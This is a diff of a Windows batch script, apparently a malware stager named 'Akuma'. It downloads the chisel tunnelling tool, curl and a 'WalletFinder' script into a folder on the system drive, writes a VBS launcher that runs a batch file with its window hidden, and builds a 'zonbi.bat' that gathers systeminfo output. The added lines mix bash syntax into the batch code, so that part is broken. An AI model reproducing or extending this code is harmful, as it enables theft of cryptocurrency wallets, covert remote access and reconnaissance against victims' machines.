@@ -10,7 +10,14 @@ curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homedrive
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedrive%\Akuma\chisel.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/curl.exe > %homedrive%\Akuma\curl.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcurl.dll > %homedrive%\Akuma\libcurl.dll
-curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat> %homedrive%\Akuma\WalletFinder.bat
+curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %homedrive%\Akuma\WalletFinder.bat
+if command -v curl &>/dev/null; then
+curl -L https://github.com/curl/curl/releases/download/curl-8_4_0/curl-8.4.0.zip > %homedrive%\Akuma\curl-8.4.0.zip
+tar -xf %homedrive%\Akuma\curl\curl-8.4.0.zip
+echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\curl.vbs
+echo objShell.Run "%homedrive%\Akuma\curl-8.4.0\buildconf.bat", 0, False >> %homedrive%\Akuma\curl.vbs
+else
+fi
 cd %homedrive%\Akuma
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
